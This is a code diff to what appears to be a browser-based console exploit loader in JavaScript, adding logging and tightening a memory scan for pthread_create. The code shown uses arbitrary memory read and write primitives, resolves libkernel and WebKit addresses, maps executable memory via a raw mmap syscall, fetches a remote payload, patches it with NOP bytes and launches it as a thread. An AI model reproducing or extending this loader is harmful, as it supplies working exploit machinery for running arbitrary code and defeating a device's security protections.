@@ -1592,27 +1592,31 @@ function findPthreadCreate(c) {
   const check = function (fn) {
     if (!c.libkernelBase) return false;
     const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-    return (fn.hi >>> 0) === (c.libkernelBase.hi >>> 0) && d > 0 && d <= 0x400000;
+    return (fn.hi >>> 0) === (c.libkernelBase.hi >>> 0) && d > 0 && d <= 0x100000;
   };
 
   if (c.webkitBase) {
+    say("[p] reading pthread slot +0x" + slot.toString(16));
     const raw = c.p.read8(c.webkitBase.add32(slot));
     const fn = v(raw.low, raw.hi);
-    say("[p] pthread slot +0x" + slot.toString(16) + " = " + text(fn));
-    if (check(fn)) return fn;
+    say("[p] slot holds " + text(fn));
+    if (check(fn)) { say("[p] slot is valid"); return fn; }
+    say("[p] slot is not in libkernel");
   }
 
-  if (!c.libkernelBase) return null;
-  say("[p] slot invalid -- scanning libkernel for pthread_create");
-  for (let o = 0; o < 0x400000; o += 4) {
+  if (!c.libkernelBase) { say("[p] no libkernel base -- cannot scan"); return null; }
+  say("[p] scanning libkernel for pthread_create (0x100000, step 8)");
+  const limit = 0x100000;
+  for (let o = 0; o < limit; o += 8) {
     const q = c.p.read8(c.libkernelBase.add32(o));
     const fn = v(q.low, q.hi);
     if (!check(fn)) continue;
     const d = (fn.low - (c.libkernelBase.low >>> 0)) >>> 0;
-    if (d === 0 || d > 0x400000) continue;
-    say("[p] candidate pthread_create at libkernel +0x" + d.toString(16) + " = " + text(fn));
+    if (d === 0) continue;
+    say("[p] candidate at libkernel +0x" + d.toString(16) + " = " + text(fn));
     return fn;
   }
+  say("[p] scan found nothing in 0x100000");
   return null;
 }
 
@@ -1655,11 +1659,12 @@ async function loadElf(url, blob) {
   }
 
   const entry = plus(got, info.entry - base);
-  say("[p] entry at " + text(entry) + " -- starting thread");
+  say("[p] entry at " + text(entry) + " -- resolving pthread_create");
 
   const fn = findPthreadCreate(c);
   if (!fn) { say("[p] no pthread_create -- ELF sits loaded at " + text(got) + ", not started"); return false; }
 
+  say("[p] calling pthread_create at " + text(fn));
   const thr = alloc(8); thr.u8.fill(0);
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
   const handle = qAt(thr, 0);
@@ -1669,6 +1674,7 @@ async function loadElf(url, blob) {
 
 async function loadPayload(url) {
   const c = host();
+  say("[p] fetching " + url);
   const blob = await fetchBytes(url, "p");
   if (blob === null) return false;
   say("[p] got " + blob.length + " bytes, first=0x" + (blob[0] || 0).toString(16));
@@ -1685,6 +1691,7 @@ async function loadPayload(url) {
   }
 
   const size = (blob.length + 0x3fff) & ~0x3fff;
+  say("[p] mapping 0x" + size.toString(16) + " for the raw payload");
   const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
   const entry = v(m.lo, m.hi);
   if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
@@ -1700,7 +1707,7 @@ async function loadPayload(url) {
   if (probe === undefined || probe === null) {
     say("[p] entry page does not execute in ring 3 -- stopping"); return false;
   }
-  say("[p] entry page executes in ring 3, loading payload");
+  say("[p] entry page executes in ring 3, copying payload");
 
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
@@ -1725,11 +1732,12 @@ async function loadPayload(url) {
 
   for (let o = 0; o < 4; o++) wr1(plus(entry, 0x1136 + o), 0x90);
   say("[p] kpayload entry call NOP'd (0x1136) -- loader-only run");
-  say("[p] payload copied and verified, starting thread");
+  say("[p] payload copied and verified, resolving pthread_create");
 
   const fn = findPthreadCreate(c);
   if (!fn) { say("[p] no pthread_create -- payload sits loaded at " + text(entry) + ", not started"); return false; }
 
+  say("[p] calling pthread_create at " + text(fn));
   const thr = alloc(8);
   thr.u8.fill(0);
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
